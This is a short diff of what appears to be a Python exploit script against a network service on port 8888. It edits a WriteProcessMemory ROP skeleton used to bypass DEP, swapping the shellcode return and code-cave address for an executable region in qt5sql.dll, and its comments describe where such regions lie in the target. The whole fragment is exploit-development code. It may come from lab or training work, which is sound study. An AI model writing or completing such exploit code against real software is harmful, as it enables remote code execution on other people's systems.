@@ -13,10 +13,12 @@ try:
     port = 8888
     size = 2000
 
+    # Read executable memory region is found at 0x0044b0e0 in q5gui but needs to be manually patched
+    # Found qt5sql.dll has executable memory region at 0x6d9ed3f0, do not require patch
     wpm  = pack("<L", (0x46464646))  # Dummy WriteProcessMemory Address (Address of IAT entry containing WPM)
-    wpm += pack("<L", (0x61f8b140))  # Shellcode Return Address (Return address after executing WPM) 
+    wpm += pack("<L", (0x6d9ed3f0))  # Shellcode Return Address (Return address after executing WPM) 
     wpm += pack("<L", (0xFFFFFFFF))  # Pseudo Process handle (0xFFFFFFFF is set, it is -1 for the current process) Value of hProcess
-    wpm += pack("<L", (0x61f8b140))  # Code cave address (Shellcode RET Address) (Value of lpBaseAddress)
+    wpm += pack("<L", (0x6d9ed3f0))  # Code cave address (Shellcode RET Address) (Value of lpBaseAddress)
     wpm += pack("<L", (0x49494949))  # Dummy lpBuffer (Stack address) 
     wpm += pack("<L", (0x50505050))  # Dummy nSize 
     wpm += pack("<L", (0x51515151))  # lpNumberOfBytesWritten 
